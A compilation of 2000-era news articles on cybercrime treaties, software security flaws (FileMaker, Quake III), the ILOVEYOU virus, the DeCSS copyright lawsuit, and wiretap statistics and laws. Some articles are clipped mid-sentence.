      February, the week after the denial-of-service attacks took place. 

      "Some countries have weak laws, or no laws, against computer crimes, 
      creating a major obstacle to solving and to prosecuting computer crimes. I 
      am quite concerned that one or more nations will become 'safe havens' for 
      cyber-criminals," Reno said. 

      
      Civil libertarians say the Justice Department will try to pressure the 
      Senate to approve the treaty even if it violates Americans' privacy 
      rights. 

      "The Council of Europe in this case has just been taken over by the U.S. 
      Justice Department and is only considering law enforcement demands," says 
      Dave Banisar, co-author of The Electronic Privacy Papers. "They're using 
      one more international organization to launder U.S. policy." 

      Banisar says Article 6 of the measure, titled "Illegal Devices," could ban 
      commonplace network security tools like crack and nmap, which is included 
      with Linux as a standard utility. "Companies would be able to criminalize 
      people who reveal security holes about their products," Banisar said. 

      "I think it's dangerous for the Internet," says Barry Steinhardt, 
      associate director of the American Civil Liberties Union and a founder of 
      the Global Internet Liberty Campaign. "I think it will interfere with the 
      ability to speak anonymously." 

      "It will interfere with the ability of hackers -- using that term in a 
      favorable light -- to test their own security and the security of others," 
      Steinhardt said. 

      Solveig Singleton, director of information studies at the libertarian Cato 
      Institute says it's likely -- although because of the vague language not 
      certain -- that anonymous remailers will be imperiled. 

      The draft document says countries must pass laws to "ensure the 
      expeditious preservation of that traffic data, regardless whether one or 
      more service providers were involved in the transmission of that 
      communication." A service provider is defined as any entity that sends or 
      receives electronic communications. 

      Representing the U.S. in the drafting process is the Justice Department's

      Monday, May 1, 2000 FileMaker admits security flaws FileMaker on Monday 
      issued a statement confirming security flaws in the Web Companion software 
      that's part of the company's FileMaker Pro 5 database package. The flaws, 
      first reported by software developer Blue World Communications, make it 
      possible for Internet users to view the contents of online Web Companion 
      databases and access the plug-in's e-mail functions without authorization. 
      A third flaw allows unauthorized users to send anonymous or impersonated 
      e-mail. 

      Web Companion is a plug-in that allows users to post FileMaker databases 
      on the Web. 

      "At this point, we know of no customers who have experienced problems due 
      to these issues, and these issues only concern users publishing FileMaker 
      databases via our Web Companion," FileMaker public relations manager Kevin 
      Mallon said in the statement. "But because the security of our customers' 
      data is and always has been an overriding priority at FileMaker, we are 
      committed to sharing what we know quickly and accurately. 

      "More importantly, we intend to fully investigate and address any bugs as 
      quickly as possible. Resolving these issues is a top priority for 
      FileMaker." 

      Mallon wrote that "some technologies in the Web Companion may 
      inappropriately expose field contents which the user thinks are protected 
      by Field-Level Security. FileMaker intends to address this problem as soon 
      as possible." 

      Until FileMaker issues a fix, he said that users be aware that Field-Level 
      Security may not be reliable, and suggested alternative security schemes, 
      such as password protection in FileMaker or Function-Level Security in the 
      Web Security Database. 

      Mallon advised Web administrators concerned about the e-mail flaw to 
      activate Web Companion's Logging feature--accessed through Preferences--to 
      track requests sent to the plug-in. "This is a good general practice in 
      any case," he wrote. 

      Blue World said that customers can set up the company's Lasso Web Data 
      Engine as a secure proxy for Web Companion databases, allowing use of 
      Lasso's security features to restrict access. Other alternatives include 
      disabling Web Companion or using an earlier version of FileMaker.

      Daily News Teen Sentenced in Columbine Web Threat By Martin Stone, 
      Newsbytes May 02, 2000

      
      A judge in Denver has reportedly handed down a four-month prison sentence 
      to an 18-year-old Florida man convicted of sending a chat-room message 
      threatening violence at Columbine High School, scene of a shooting spree 
      last year which claimed 15 lives.

      A Reuters report Monday said the teen, Michael Ian Campbell, collapsed in 
      the courtroom after being handed the sentence. Campbell pleaded guilty in 
      February to "transmitting a threat of violence" across state lines. His 
      lawyer attempted a novel defense based on "Internet intoxication."

      The report said a Columbine student, 16-year-old Erin Walton, was in a 
      chat room on Dec. 15 when Campbell told her to stay away from school the 
      next day because he planned to "finish what begun," which authorities 
      argued made a clear reference to the massacre and led school officials to 
      cancel classes for two days.

      Campbell is reported to be suffering from depression and had attempted 
      suicide following his arrest at his Florida home after officials at 
      America Online helped police trace the origin of the message. He has since 
      apologized for the episode, and prosecutors had recommended a light 
      sentence. But, the judge maintained that though he could have given 
      Campbell probation or a sentence of up to six months, he felt the 
      four-month sentence would serve as a deterrent to others, the report said.

      Pager Eavesdropping Trial OK'd

      
      BY MARK HAMBLETT New York Law Journal Tuesday, May 2, 2000 

      A CHALLENGE to a federal prosecution under the Electronics Communications 
      Privacy Act involving eavesdropping of alphanumeric pagers has been 
      rejected by a Southern District judge.

      Senior Judge Shirley Wohl Kram refused to dismiss a case against a New 
      York City police officer who allegedly used software to read paging 
      messages by the police department.

      Judge Kram rejected arguments by the officer that reading the pages is not 
      forbidden under the act, and that he was the victim of selective 
      prosecution in the case, United States v. Sills, 99 Cr. 1133.

      Kevin Sills, a police officer for the city since 1996, was the subject of 
      a sting operation in 1998 by a criminal investigator working for the U.S. 
      Attorney's Office.

      The two-count indictment charged that between 1996 and 1998, Mr. Sills 
      possessed software that was programmed to intercept alphanumeric pager 
      messages  a violation of §2512(1)(b) of the act. It also charged Mr. 
      Sills with violating §2511(1)(a) of the act by intercepting such messages.

      The software, called "Message Tracker," is manufactured by a Texas company 
      called K & L Technology. When used in conjunction with a radio scanner, 
      Message Tracker can be used to intercept messages from the targeted pager 
      and display them on a computer.

      In phone conversations with an employee of K & L Technology who was 
      cooperating with the investigator, Mr. Sills allegedly said that he had 
      been reading other pagers, asked the employee if the company would modify 
      his scanner so it worked in conjunction with a more advanced version of 
      Message Tracker and then ordered the modifications to be done.

      Investigator Ronald G. Gardella, posing as a Federal Express delivery man, 
      then delivered to Mr. Sills' home his newly modified scanner and the 
      latest version of Message Tracker software. An ensuing search of the 
      premises allegedly turned up a computer file containing "Capcodes," which, 
      along with specific radio frequency, make up the electronic address for 
      pagers and distinguishes them from other pagers. Prosecutors charged that 
      one of the Capcodes in that file belonged to the pager used by the body 
      guard and driver for Police Commissioner Howard Safir.

      Mr. Sills moved to dismiss the charges before Judge Kram.

      First, he said his conduct was exempt under §2511(g) of the act, which 
      excludes any radio communication transmitted by any governmental, law 
      enforcement or public communications system "readily accessible to the 
      general public."

      Quoting the statute, Judge Kram said the act defines "readily accessible" 
      as radio communications that are not "transmitted over a communication 
      system provided by a common carrier, unless the communication is a tone 
      only paging system communication."

      Not 'Tone Only'

      She said it was "undisputed" that the communications being intercepted by 
      Mr. Sills were not "tone only" transmissions, and therefore, the 
      transmissions at issue were not "readily accessible to the general 
      public."

      Mr. Sills argued that he was singled out because he was a police officer 
      and said that "this case appears to be the first prosecution, in this 
      district or anywhere, involving alphanumeric pager interceptions when 
      there is no dissemination of the intercepted information."

      He said the equipment he used was advertised on the open market and the 
      government has never chosen to prosecute news organizations and private 
      individuals who "knowingly pay for intercepted police pager 
      communications."

      Mr. Sills said that when the government prosecuted the Breaking News 
      Network for profiting from the dissemination of intercepted pager 
      information, including police messages, the government did not prosecute 
      people or news organizations who paid for BNN's service.

      Judge Kram disagreed.

      "Whereas BNN's customers obtained pager messages through a purported 
      'service provider,' Sills directly intercepted them," she said.

      Assistant U.S. Attorney David Raskin represented the government. Bradley 
      D. Simon represented Mr. Sills.

      DOWN BY LAW BY JEFF HOWE When Movie Moguls Wage War to Protect Copyright, 
      the First Amendment Ends Up on the Cutting Room Floor

      

      n the world of Martin Garbus, we are all teachers and he is the student. 
      This at least partly explains why an otherwise innocent DVD player lies in 
      pieces on the coffee table in his Madison Avenue law office. The teacher 
      today is Chris DiBona, prominent evangelist of the open-source creedthe 
      belief that computer code, like speech, wants to be free. 

      DiBona is teaching Garbus, who only recently learned how to work his own 
      e-mail, why a miniscule bit of silicon in this playerand an equally 
      miniscule program built to bypass ithave sparked a federal case that will 
      determine whether we pass through the digital age with the First Amendment 
      intact. 

      As DiBona speaks, pointing at various organs in the innards of the DVD 
      player, Garbus leans forward and listens intently. Very intently. You can 
      almost hear the sound of files shifting and expanding inside Garbus's 
      cerebrum. The force of this man's concentration could bend spoons, or 
      laws. "I chose this life so I could forever remain a student," Garbus 
      says, in a not-infrequent display of mock humility. 

      This life, as it happens, has also allowed Garbus to remain a high-profile 
      rebel. Perhaps the closest thing in New York to a modern-day Daniel 
      Webster, Garbus has made a living by fighting the dark side in all its 
      forms. A laundry list of Garbus's clients reveals a Zelig-esque talent for 
      being on the right side of the right fight at the right time. Garbus 
      fought for Lenny Bruce in '64, for Timothy Leary in '66, and against 
      Alabama governor George Wallace in '68. A few years later he hid the 
      Pentagon Papers in his attic for reporter Daniel Ellsberg. He has argued 
      before the Supreme Court on 20 occasions, winning each time. Garbus has 
      fought to protect the copyright of work by Samuel Beckett, Robert Redford, 
      Al Pacino, and John Cheever. 

      

      The hacker's writer: Web scribe Eric Corley launched a First Amendment 
      fight when he posted a program that breaks the code of DVDs.       So why 
      has Garbus, with his eye for the limelight and his zeal for the sanctity 
      of intellectual property, taken on the cause of a Long Island 
      cyberjournalist accused by the Motion Picture Association of America of 
      being a copyright thief? 

      "He gets it," says his client, Eric Corley, publisher of the quarterly 
      journal 2600 (www.2600.com), commonly referred to as the "hacker bible," 
      and enemy number one of big Hollywood. 

      Last fall Corley, who goes by the nom de Net of Emmanuel Goldstein, posted 
      to 2600 a program that allows technology-savvy folk to decipher the code 
      of DVDs and then view the films on unlicensed players. The open-source set 
      calls this a First Amendment right. Hollywood calls it piracy and fears a 
      brave new world where people get their movies on the Web for free. In 
      January, the motion picture association slapped Corley and two other 
      defendants with a federal suit alleging copyright violation. 

      When Corley says Garbus "gets it," he's offering no light praise, since 
      factual error, bald deception, and simple misunderstanding have obscured 
      what initially looked like an open-and-shut case for the motion picture 
      industry. The movie moguls are banking on the Digital Millennium Copyright 
      Act of 1998, which expressly forbids providing anything "primarily 
      designed or produced for the purpose of circumventing a technological 
      measure that effectively controls access to a [copyrighted] work." In 
      plain English, that means you can't hand out a tool that breaks through 
      copyright protection. 

      The tool now in question is DeCSS, which appears to smash those barriers, 
      bypassing the Content Scrambling System that guards DVDs and allowing 
      users to do with the contents what they will. 

      Armed with that premise, Hollywood took round one by a rout in January, as 
      a federal district judge granted an injunction that blocked Corley and the 
      other defendants (who have since been dropped from the suit) from posting 
      DeCSS. But Corley battled back, posting a collection of links to sites 
      around the world willing to offer the program. That prompted the motion 
      picture association last month to ask that the injunction be extended to 
      ban such links. 

      By any account except Hollywood's, granting the request would be an 
      egregious gagging of free expression. A newspaper like this one, for 
      instance, would be forbidden from telling its readers how to find the 
      source code to DeCSS on cryptome.org. This so-called prior restraint is a 
      special bugbear of the fourth estate. No surprise, then, that The New York 
      Times has expressed its concern and may file a brief on behalf of Garbus 
      and his client. 

      For his part, Garbus will submit that DeCSS is an exercise in 
      cryptography, an innovation in interoperability, and protected speech to 
      boot. Under that argument, the program should be covered by the "fair use" 
      principle of the First Amendmentputting the Digital Millennium Copyright 
      Act and freedom of expression at irreconcilable odds. 

      The case for the defense does not look good. The entertainment industry is 
      garnering court victories in the fight between the right of commerce to 
      protect intellectual property and the right of Netizens like Corley to 
      speak their minds. Last week, a federal judge in New York ruled for the 
      Recording Industry Association of America in its copyright infringement 
      suit against MP3.com, which allows users to post and download CDs for 
      online listening. 

      Garbus knows lower courts are not often inclined to contradict Congress, 
      so he's already plotting strategies for appeal all the way to the Supreme 
      Court. The matter is being closely followed by Internet wonks, pundits, 
      and practitioners, not to mention those civil libertarians who "get it." 

      "If the judge finds for the plaintiff, and the decision isn't knocked down 
      on appeal," says Yochai Benkler, a professor of information law at New 
      York University, "it will create an environment that's closed like nothing 
      we've ever seen before." 

      Welcome to the latest front in the war for the First Amendment. 

      

      --------------------------------------------------------------------------
      ------

      Eric Corley looks like a hacker. All stringy black hair, pale skin, and 
      hunched shoulders, Corley has the unmistakable pallor of someone who 
      spends most of his time alone in front of a computer screen. Hollywood 
      could not have picked a better physical specimen for their relentless 
      campaign to portray the open-source communityprogrammers and users of 
      operating systems and software whose source code is freely availableas 
      "thieves and pirates." 

      But Corley fails that test in one important regard: He does not hack. He 
      "couldn't hack his way into a paper bag," says one ex-hacker who, 
      naturally, chooses to remain anonymous. 

      No electronic trespasser, Corley is a journalistand not one lacking in 
      considerable credentials. His journal 2600, founded in 1984, boasts a 
      circulation of 60,000. Between 10,000 and 15,000 visitors drop by the 
      site. Corley hosts a weekly radio broadcast and has appeared on numerous 
      talk shows, including Charlie Rose, Nightline, and 60 Minutes. He has 
      testified before Congress and written editorials for the Times and the 
      Daily News. He gave the commencement address when he graduated from SUNY 
      Stony Brook. He says the movie moguls didn't know how much fight they'd 
      get when they homed in on him. "It was foolish of them to pick [2600]," 
      Corley says. "We've always stood up against this kind of thing. We don't 
      know how to back down." 

      The fact that Corley is a scribe for the hacker world may make him a 
      likely suspect for the motion picture association, but not necessarily a 
      wise one. Corley counts among his admirersand readerscountless 
      programmers and academics. Oddly, the same logic that made him a target 
      for the movie industry also made him a client that Garbus couldn't pass 
      up. 

      In the DVD trial, the First Amendment lawyer found a story with clearly 
      drawn opponents worthy of a pulp-fiction plot: a powerful, wealthy 
      industry versus a corps of overworked, denigrated protectors of civil 
      liberties. This is white hats against black hats, heroes facing up to 
      villains, good law butting heads with bad. 

      With self-righteous zeal, the motion picture association has harassed open 
      sourcers and free-speech advocates who have posted, or merely linked to, 
      the program once offered by Corley. Soon after Hollywood realized movie 
      discs had been hacked, they fired a salvo of cease-and-desist letters to 
      anyone offering DeCSS. On December 28, the trade organization in charge of 
      licensing movie rights for DVD players filed suit in California, naming 21 
      individuals and "Does 1-500, inclusive." That's Does as in John, a deft 
      bit of legal language that allows the plaintiff to attack retroactively 
      anyone it chooses. In mid January, Norwegian authorities raided the Oslo 
      home of 16-year-old Jon Johansen, who is accused of first providing DeCSS 
      on the Web. 

      From the beginning, the movie association has made little effort to 
      disguise its enmity toward the hacker community, calling them "nerds" and 
      "anarchists." The group has sent cease-and-desist letters to people in 
      Germany and Australia, places far outside the jurisdiction of injunctions 
      issued in the United States. A 2600 correspondent in Connecticut has been 
      targeted with another federal suit, and a University of Wisconsin student 
      was fired from his job at a computer lab after a letter from Hollywood 
      landed on his boss's desk. 

      For Garbus, the plight of the open-source community is clear. "There is 
      little question in my mind this persecution of hackers is, in many 
      respect, analogous to the Communist red-baiting of yore," he says. "They 
      are being unfairly maligned, and stigmatized, without due cause." 

      According to John Gilmore, the co-founder of the Electronic Frontier 
      Foundation, a civil-liberties group that has picked up the defense tab in 
      all the DVD suits, the program Corley posted was originally one part of an 
      open-source project to develop a movie disc player for the Linux operating 
      system favored by hardcore programmers. Linux supporters saw Hollywood's 
      tactics as a call to arms. They posted thousands of copies of DeCSS 
      throughout the Web as a show of support for Corley. 

      And if the online proliferation weren't enough, the lawyers representing 
      Hollywood accidentally entered the entire DeCSS source code into the 
      public record. 

      All this for a program that Corley and much of the computing community 
      insist doesn't even do what the film executives say it does: encourage the 
      copying of DVDs. Corley argues DeCSS exists solely to allow people to view 
      movies they own on unlicensed players, like ones that run on Linuxan 
      operating system Hollywood refused to license. "You have to wonder, why 
      are they so upset at people knowing how to use their technology?" Corley 
      says. "They don't care about copying. Copying is easy. People have been 
      copying for ages. There are whole warehouses in Asia copying DVDs and 
      nothing else." 

      Yet when the film industry first filed suit in California last November, 
      president Jack Valenti raised the specter of marauding hackers and thieves 
      out to defraud Hollywood. Valenti told Daily Variety: "[W]e don't have 
      broadband access today, so we don't have many [pirated] movies on the 
      Internet today . . . By the middle or end of next year, we will have an 
      avalanche." 

      But a month before Valenti's apocalypse was scheduled to appear, a lawyer 
      for the industry group admits he, the former deputy director of the 
      antipiracy division, has yet to uncover a single instance of piracy using 
      DeCSS. "Do I know of any incidents of piracy, personally? No," says Greg 
      Goeckner. "But I would have to check with my team in the field." 

      The movie association may have a hard time uncovering any pirates sailing 
      under the DeCSS flag. Gilmore, of the Electronic Frontier Foundation, 
      explains that DVD movies are far too big for easy duplication. "The only 
      place you could store your movie would be on your hard drive," he says, 
      "and even then you could only hold four such movies at most." Gilmore also 
      points out that it could take hundreds of hours to download a DVD over a 
      56k modem, so merely transferring these files would mean disabling your 
      computer for weeks, all for the purpose of gaining a bootleg copy of The 
      Matrix. The film association hasn't found any instances of DeCSS piracy 
      for one simple reason: There's no cause to do it. 

      

      --------------------------------------------------------------------------
      ------

      If DeCSS isn't likely to be used for pirating movies, why does the program 
      pose a threat so dire that Hollywood turned to the courts for relief? 

      This will be one of Garbus's first questions, if he ever sees the 
      courtroom on Corley's behalf. On April 25, attorneys for the movie 
      association filed a motion to disqualify Garbus from the case. Garbus's 
      firm, it turns out, represents Scholastic in an unrelated case. Time 
      Warner, a member of the association, owns Scholastic, and you're not 
      supposed to defend and attack the same client at the same time. This 
      technicality may be enough to kick Garbus out of the suit. "He probably 
      has a 50-50 chance," speculated one legal observer close to the action. 

      If Hollywood wins, Garbus is gone, barred from appearing for Corley as 
      counsel. The Electronic Frontier Foundation and Corley go back to 
      soliciting solicitors, their appeal enhanced through association with 
      Garbus. 

      If the motion fails, the movie execs will have a formidable foe on their 
      hands. War is hell and so is law, and Garbus sees little difference 
      between the two. 

      But a firebrand trial lawyer isn't all Corley gets. Garbus is an icon of 
      "East Coast Code," a term coined by Lawrence Lessig to describe the legal 
      code. Garbus must now convince the court to consider the rights of "West 
      Coast Code," or source code. 

      He will argue that DeCSS falls under the First Amendment's fair-use 
      exception to the Copyright Act. The doctrine of fair use permits, for 
      example, a reporter to quote paragraphs from a book or print sections of a 
      pamphlet. 

      In the case of DVDs, the only way a consumer can copy specific portions is 
      to use DeCSS. Barring people from doing that is a more insidious 
      encroachment on individual liberty than it first appears. "Say you want to 
      criticize the liberal leanings of Hollywood, or criticize the sexist movie 
      of this or that," says Benkler, the NYU law professor. "You need to be 
      able to quote little pieces of the movie. You can do that under the 
      copyright law, because that's fair use, but using DVDs lawfully as the 
      [film association] reads the law, you can't do that. This really 
      extinguishes user privilege to an unprecedented degree." 

      This same privilege was triedand survivedin an oft-cited suit in 1984 
      involving Betamax, which manufactured early video recorders. The question 
      then was the same one asked now: whether the entertainment industry's 
      right to safeguard its products carries more weight than the right of 
      individuals to access copyrighted works for their own expressive, and 
      protected, ends. 

      The First Amendment also protects a process called reverse-engineering, 
      which was used to create DeCSS. Reverse engineers take things apart in 
      order to learn how to put them back together in a better form. 

      In other words, to build a better mousetrap. The right to take things 
      apartwhether breakfast cereals or pharmaceutical compoundsis a 
      time-honored tenet in American law, held to encourage innovation. 

      So far, judges have been friendly to reverse engineers. This year, the 
      Ninth U.S. Circuit Court of Appeals ruled that Connectix's Virtual Game 
      Station, which allows Mac users to play Sony PlayStation games on their 
      computers, had not violated copyright law because it was 
      reverse-engineered from PlayStation. 

      In the case of DeCSS, the upshot is that the program is already out there. 
      The DVD encryption was a flimsy system that everyone in the open-source 
      world knew would be hacked, sooner rather than later. East Coast Code may 
      enjoin open-source programmers and "pirates" from posting and trading 
      DeCSS, but with an estimated 300,000 copies already in existence, only 
      West Coast Code, i.e., a better encryption scheme, is going to maintain 
      Big Hollywood's grip on user privilege. In the Wild, Wild Web, you're 
      responsible for your own fences. East Coast Code don't mean shit.

     'I love you' e-mail virus spreading
 
      A Melissa-like computer virus, bearing the title 'I love you,' is
      sweeping through Asia and appears to be spreading worldwide.

  
      WSJ Interactive Edition May 4, 2000 4:40 AM PT 

      HONG KONG -- A computer virus spread by e-mail messages bearing the title 
      "I Love You" spread through Asian businesses Thursday afternoon, and 
      appeared to be quickly tainting computer systems world-wide.        If the 
      attachment holding the virus is opened, the virus apparently multiplies by 
      finding other e-mail addresses and prompting the computer to generate new 
      e-mail. Victims sometimes receive dozens of e-mail messages, all 
      contaminated with the virus.

      The virus, which appeared in Hong Kong late Thursday afternoon, seemed to 
      particularly hit, among other businesses, public relations firms and 
      investment banks. Dow Jones and the Asian Wall Street Journal offices in 
      Asia were among its victims. 

      In Hong Kong, Nomura International Ltd. is receiving the e-mail virus, an 
      analyst said. The virus has created a lot of damage in Nomura's London 
      office, he said. "It just multiplies through the system and eradicates 
      whole address books," the analyst said. 

      Simon Flint, currency strategist at Bank of America in Singapore, said he 
      has received e-mail messages warning him of the virus but hasn't received 
      the actual virus

Quake III flaw could frag your computer
 
Apply the patch now. Otherwise, a Trojan server could be shooting up your system while you play.

      Game developer Id Software Inc. announced on Wednesday that its flagship 
      first-person shooter has a security flaw that could leave Quake III 
      players' computers open to attack while they play.       "The basic nature 
      of the exploit is that malicious server operators could overwrite any file 
      on a client system," wrote Robert Duffy, a programmer at Id Software , in 
      his .plan file on Wednesday.

      The flaw was found last week by network security firm Internet Security 
      Systems Inc. and could allow an attacker running a Quake III server to 
      read and write to any player's computer connecting that server. Internet 
      Security Systems waited until Id Software could issue a patch before 
      sending out an alert to users and the press.

      "This vulnerability is important to network administrators who may be 
      unaware that users are accessing potentially malicious Quake3Arena servers 
      outside their network," wrote Internet Security Systems in the alert.

      Id Software fixed the flaw in its latest patch release, Version 1.17, 
      released on Wednesday.

        
      To force users to move over to the secured Quake III client, Id Software 
      has made Version 1.17 of the game incompatible with earlier -- and 
      insecure -- versions.

       Technology boosts government wiretaps Fax machines, cell phones, pagers 
       and e-mail targeted

      By Richard Willing, USA TODAY

      WASHINGTON - Wiretaps ordered by federal and state authorities on cell 
      phones, pagers, fax machines and e-mail increased by nearly 20% last year, 
      pushing the total number of government wiretaps to a record 1,350.

      Traditional wiretaps, such as microphones hidden in walls and "bugs" 
      planted on telephone lines, account for about one-third of all 
      surveillance devices, according to an annual wiretap survey released 
      Tuesday by the Administrative Office of the U.S. Courts. 

      Many of the taps were done by devices that pluck calls from the air or 
      eavesdrop at cellular phone switching stations.

      Nearly three-quarters of the taps were ordered in narcotics 
      investigations, the report said.

      The overall increase was fueled by improved surveillance technology and by 
      the continued aggressive use of taps by the Clinton administration 
      Department of Justice. 

      In 1999, the Justice Department got court permission to carry out 601 
      wiretaps, up from the 340 authorized in 1992, the year before Clinton took 
      office.

      "Clinton supported wiretapping when he was governor of Arkansas, and 
      there's been a noticeable push since he became president," said David 
      Banisar, senior fellow of the Electronic Privacy Information Center, a 
      watchdog group in Washington.

      "At the same time, you've got the explosion in cell phones happening," 
      Banisar said. "Everyone is using them, including the people the police 
      want to intercept."

      Justice Department spokeswoman Chris Watney said wiretaps were used in 
      fewer than 1% of the 50,000 criminal cases brought by the department last 
      year. "That shows you how selective we are in deciding when wiretaps are 
      necessary and appropriate," she said. 

      Under a 1968 federal law and separate laws in 42 states, police may obtain 
      permission to tap only by convincing a judge that the device would produce 
      evidence of a crime that could not be obtained any other way. No state or 
      federal request was turned down last year; three have been rejected since 
      1989.

      Among the report's other findings:

      Wiretaps sought by state and local authorities declined by 2% last year, 
      the first such decrease since 1995.

      The overall increase in wiretaps produced more arrests in 1999 but a lower 
      conviction rate, about 15%.

      Five states - New York, California, New Jersey, Pennsylvania and Illinois 
      - accounted for 81% of all state-ordered wiretaps approved last year.

      Fourteen of the 42 states that authorize wiretaps ordered no taps.

      Federal agents sought authority for seven e-mail taps last year, two more 
      than in 1998. 

      "Roving" taps, a recently authorized federal technique aimed at 
      individuals rather than phone or pager numbers, increased from 12 in 1998 
      to 23 last year.

      The tendency to rely on wiretaps varied among prosecutors. Taps were used 
      extensively, for example, in federal drug investigations in central 
      California and southern Florida. New York City's Special Narcotics Bureau 
      got permission for 135 taps, more than any state other than New York.

      New technology helped simplify the process of tapping cell phones. 
      Increasingly, cell phone tappers listen in at central switching stations 
      as calls are relayed to other cellular or hard-wired phones. Police also 
      use "trigger fish," devices that can pluck cell calls out of the air but 
      must be used near the caller.

      Surveillance of Drug Offense Operations Drives 1999 Growth       in 
      Applications for Wiretaps

      
      The number of applications for wiretap orders requested in 1999 rose 2 
      percent to 1,350, up from 1,331 in 1998, according to the 1999 Wiretap 
      Report, A Report of the Director of the Administrative Office of the 
      United States Courts on Applications for Orders Authorizing or Approving 
      the Interception of Wire, Oral, or Electronic Communications. Federal or 
      state judges authorized all applications that were requested. In 1999, 
      violation of drug laws remained the major offense investigated through 
      wiretaps, with racketeering as the second largest category. The most 
      common location for the placement of wiretaps was in a single family 
      dwelling. In 1999, a total of 4,372 persons were reported arrested based 
      on interceptions of wire, oral, or electronic communications. The wiretap 
      report is submitted annually to Congress by the Administrative Office of 
      the U.S. Courts.

      
      During 1999, 28 jurisdictions reported using wire, oral or electronic 
      surveillance as an investigative tool. The federal government, the 
      District of Columbia, the Virgin Islands and 42 states currently have laws 
      authorizing courts to issue orders permitting such surveillance. The 
      number of applications approved by federal courts in 1999 increased 6 
      percent, while approvals by state courts fell 2 percent below the 1998 
      levels. (See attached Table 1.)

      
      Wiretap applications in New York (343 applications), California (76), New 
      Jersey (71), Pennsylvania (69), and Illinois (50) accounted for 81 percent 
      of all authorizations approved by state judges. Most state laws limit the 
      period of surveillance under an original order to 30 days, although 
      extensions may be granted. Among state wiretaps, the longest was a 510-day 
      intercept used in a racketeering investigation in New York County, New 
      York. The longest federal intercept occurred in the Western District of 
      Texas, where a 289-day wiretap was used in a narcotics investigation. 

      
      A total of 978 intercept applications, or 72 percent of all applications 
      for intercepts authorized in 1999, cited drug offenses as the most serious 
      offense under investigation. Several criminal offenses may be under 
      investigation, but only the most serious offense is named in an 
      application. The use of federal intercepts to conduct drug investigations 
      was most common in the Central District of California (38 applications) 
      and the Southern District of Florida (34 applications). On the state 
      level, the New York City Special Narcotics Bureau obtained authorizations 
      for 135 drug-related intercepts, which accounted for the highest 
      percentage of all drug-related intercepts reported by state or local 
      jurisdictions. Racketeering was cited in 139 of the applications, followed 
      by homicide/assault (62), and gambling (60). (See attached Table 7.)

      
      In 1999, 18 percent of all intercept devices, or 248 wiretaps, were 
      authorized for single-family dwellings, a category that includes houses, 
      rowhouses, townhouses, and duplexes. Forty-nine percent of intercept 
      applications, or 663 applications, specified other locations. These may 
      include electronic wiretaps such as mobile telephones, electronic pagers, 
      and cellular telephones. 

      
      As of December 31, 1999, a total of 4,372 persons had been arrested based 
      on interceptions reported. Fifteen percent, or 654 persons, were 
      convicted. Federal wiretaps were responsible for the most arrests (66 
      percent) and convictions (55 percent). A wiretap in the Western District 
      of New York resulted in the arrest of 83 persons, the most arrests of any 
      intercept in 1999. A wiretap in the Southern District of Florida produced 
      the most convictions of any wiretap when an intercept used in a drug 
      investigation resulted in the conviction of 23 of the 26 persons arrested. 
      Among state intercepts, the intercept producing the most arrests took 
      place in Middlesex County, New Jersey, where an intercept in a drug 
      investigation resulted in the arrest of 72 persons. 

      
      Each federal and state judge is required to file a written report with the 
      Director of the Administrative Office of the U.S. Courts on each 
      application for an order authorizing the interception of a wire, oral, or 
      electronic communication (18 U.S.C. 2519(1)). No report to the 
      Administrative Office is required when an order is issued with the consent 
      of one of the principal parties to the communication. 

      
      A summary report on authorized intercepts is attached. The full report can 
      be found on the Judiciarys website at www.uscourts.gov.

      Georgia Lets Parents Tap Kids' Phones Officials Say Safety, Criminal 
      Concerns Outweigh Privacy Issue May 3, 2000 

      By Randy Wyles 

      ATLANTA (APBnews.com) -- Parents and prosecutors in Georgia have a new 
      weapon in their fight to protect children from crime -- the right to 
      record juveniles' phone conversations. 

      Under a new law signed by Gov. Roy Barnes last week, parents can legally 
      record their children's private phone conversations and e-mails if they 
      believe the children are in danger or involved in criminal activity. 

      The legislation stems from a case in the Atlanta suburb of Marietta in 
      which the district attorney and the parents of a 13-year-old girl said a 
      former family friend molested the teen. The prosecutor in the case had 
      tried to introduce audio recordings into court as evidence of allegedly 
      inappropriate sexual phone conversations between the child and the 
      accused. 

      Kyle "Rick" Bishop, 40, was charged with aggravated child molestation and 
      aggravated sexual battery for the alleged affair with the girl. 

      "I guarantee if you or anyone else hears the tapes, there will be no doubt 
      in anyone's mind that he is guilty," said David C. Scott, the girl's 
      father. 

      Late-night calls led to visits 

      The girl was 11 when Bishop, a neighbor, allegedly began fostering a 
      relationship with her that Scott said he wanted to develop sexually. 

        
      Scott said Bishop claims his daughter pursued him. The girl's parents 
      became suspicious when late-night phone calls led to frequent visits by 
      the child to Bishop's home to watch television. So the parents began 
      eavesdropping and recording the phone conversations. 

      One night four years ago, Scott's wife listened in on a conversation that 
      shocked her. 

      "The nature of that conversation was so sexually explicit that my wife 
      immediately called the police after making my daughter hang up the 
      telephone," Scott said. 

      One party must know of tap 

      Bishop was arrested and charged. As part of his bond agreement, he was not 
      allowed within a mile of the family, which meant he had to move. The court 
      even refused to let him return to his home, forcing Bishop to arrange for 
      friends to move his belongings. 

      The case was finally placed on the court docket last year. But during a 
      pretrial hearing, Bishop's defense attorney filed a motion preventing the 
      tapes from being introduced as evidence, citing a violation of Georgia 
      privacy laws. 

      Georgia law permits a person to record phone conversations as long as one 
      of the parties involved with the call is aware it's being done. Bishop's 
      attorney contended neither the child nor Bishop knew the calls were being 
      recorded and that the parents did not have a right to record the 
      conversations, even though they were made on the Scotts' home phones and 
      involved their child. 

      The court ruled against the defense motion, but Bishop took it to the 
      Court of Appeals, which overturned the ruling in his favor. At the same 
      time, the Georgia Legislature took up the issue and passed a measure that 
      allows parents the right to record their children's conversations. 

      Can law be applied retroactively? 

      Meanwhile, Cobb County District Attorney Pat Head of Marietta, the 
      prosecutor in the case, filed a motion to overturn the Court of Appeals' 
      decision with the Georgia Supreme Court, which has yet to rule. 

      There is some debate as to whether the new law could actually be applied 
      retroactively to the very case that sparked the legislation. 

      "If [the Georgia Supreme Court] does affirm the Court of Appeals, then 
      we're taking the position that the law that has changed is procedural and

      constitutional rights nor any of his statutory rights, but is simply a

      But the district attorney still feels positive about the new law, no 
      matter how the case is resolved. 

      "Its a tool by which the parents are going to be given, at least, the 
      availability of keeping some control of their children and knowing what 
      their children are involved in," Head said. 

      As far as the Scotts are concerned, their hopes rest with Head, the 
      Georgia Supreme Court and the new law. 

      "I'm saddened that my daughter has had a number of years of her childhood 
      stolen from her," Scott said. "But it's just not part of my constitution 
      to want to take a baseball bat to somebody. Seeing this guy go to jail, 
      that makes me very, very gratified."

     Suspected Software 
     Thieves Indicted
     Authorities Arrest Microsoft, Intel Employees 

   

